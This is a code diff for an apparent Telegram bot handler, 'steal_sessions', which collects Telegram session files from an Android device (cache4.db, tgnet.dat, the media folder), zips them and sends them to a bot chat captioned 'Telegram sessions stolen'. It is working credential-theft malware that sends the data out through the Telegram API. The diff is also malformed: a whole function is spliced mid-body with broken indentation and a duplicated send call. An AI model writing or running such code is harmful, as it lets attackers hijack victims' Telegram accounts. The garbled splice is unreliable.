@@ -69,21 +69,47 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     shutil.copy(p, STEAL_DIR)
         
         # Сжатие и отправка        
-        mem_zip = io.BytesIO()
+        import io
+import zipfile
+from pathlib import Path
+from telegram import InputFile
+
+async def steal_sessions(update, context):
+    try:
+        paths = [
+            "/data/data/org.telegram.messenger/files/cache4.db",
+            "/data/data/org.telegram.messenger/files/tgnet.dat",
+            "/sdcard/Android/media/org.telegram.messenger/"
+        ]
         
-        with zipfile.ZipFile(mem_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        mem_zip = io.BytesIO()
+
+        with zipfile.ZipFile(mem_zip, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
             for p in paths:
                 path_obj = Path(p)
                 if path_obj.exists():
                     if path_obj.is_file():
-                        zipf.write(p, arcname=path_obj.name)
+                        # Добавляем одиночный файл
+                        zf.write(path_obj, arcname=path_obj.name)
                     elif path_obj.is_dir():
-                        for subpath in path_obj.rglob('*'):
-                            if subpath.is_file():
-                                zipf.write(subpath, arcname=subpath.relative_to(path_obj.parent))
+                        # Добавляем все файлы из папки
+                        for file in path_obj.rglob('*'):
+                            if file.is_file():
+                                # arcname задаёт путь внутри архива
+                                zf.write(file, arcname=file.relative_to(path_obj.parent))
         
-        # Перематываем буфер в начало
+        # Очень важно перемотать буфер в начало
         mem_zip.seek(0)
+
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=InputFile(mem_zip, filename="stealed_sessions.zip"),
+            caption="🔥 Сессии Telegram украдены"
+        )
+    
+    except Exception as e:
+        await update.message.reply_text(f"💥 Ошибка: {str(e)}")
+
         
         await context.bot.send_document(
             chat_id=update.effective_chat.id,
